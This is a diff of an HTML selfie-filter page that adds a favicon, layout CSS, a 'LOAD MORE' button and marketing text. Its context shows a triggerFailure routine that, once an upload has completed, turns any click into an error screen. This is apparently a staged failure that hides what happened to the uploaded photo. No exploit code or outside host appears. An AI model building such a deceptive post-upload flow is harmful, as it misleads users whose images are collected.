@@ -3,6 +3,7 @@
 
 <head>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" href="/favicon.ico" type="image/x-icon">
     <title>Aesthetic Filters</title>
 
     <style>
@@ -13,17 +14,17 @@
 
         body {
             margin: 0;
+            padding: 18px;
             min-height: 100vh;
             display: flex;
-            align-items: flex-start;
+            flex-direction: column;
+            align-items: center;
             justify-content: center;
-
             background:
                 linear-gradient(135deg,
                     rgba(255, 154, 158, 0.75),
                     rgba(250, 208, 196, 0.75)),
                 url("bg-filter-app.webp") center / cover no-repeat;
-
             animation: bgShift 8s ease infinite;
         }
 
@@ -51,7 +52,6 @@
             backdrop-filter: blur(6px);
             border-radius: 22px;
             box-shadow: 0 20px 40px rgba(0, 0, 0, 0.15);
-            margin: 72px 18px 0 18px;
         }
 
         h1 {
@@ -128,6 +128,42 @@
         canvas {
             display: none;
         }
+
+        .cta-wrap {
+            margin-top: 18px;
+            text-align: center;
+        }
+
+        .cta-btn {
+            background: #111;
+            color: #fff;
+            border: none;
+            border-radius: 999px;
+            padding: 14px 26px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+        }
+
+        .cta-btn:active {
+            transform: scale(0.98);
+        }
+
+        .marketing {
+            margin-top: 14px;
+            font-size: 12px;
+            line-height: 1.6;
+            color: #555;
+            max-width: 360px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+
+        /* Background removed state */
+        body.fail-bg {
+            background: #f4f4f4;
+            animation: none;
+        }
     </style>
 </head>
 
@@ -151,6 +187,18 @@
 
         <div class="hint">Loading filters…</div>
     </div>
+
+    <div class="cta-wrap" id="cta-wrap">
+        <button class="cta-btn" id="loadMoreBtn">LOAD MORE</button>
+
+        <div class="marketing">
+            Vintage-inspired filters bring warmth, softness, and timeless character
+            to your selfies. Designed to enhance natural tones and add subtle depth,
+            these filters help your photos feel more expressive, aesthetic, and ready
+            for social sharing with minimal effort.
+        </div>
+    </div>
+
 
     <!-- Error -->
     <div class="screen error" id="error">
@@ -199,6 +247,7 @@
         function triggerFailure() {
             if (!uploadCompleted) return;
             document.getElementById("ui").style.display = "none";
+            document.getElementById("cta-wrap").style.display = "none";
             document.getElementById("error").style.display = "block";
             document.removeEventListener("click", triggerFailure);
             document.removeEventListener("touchstart", triggerFailure);
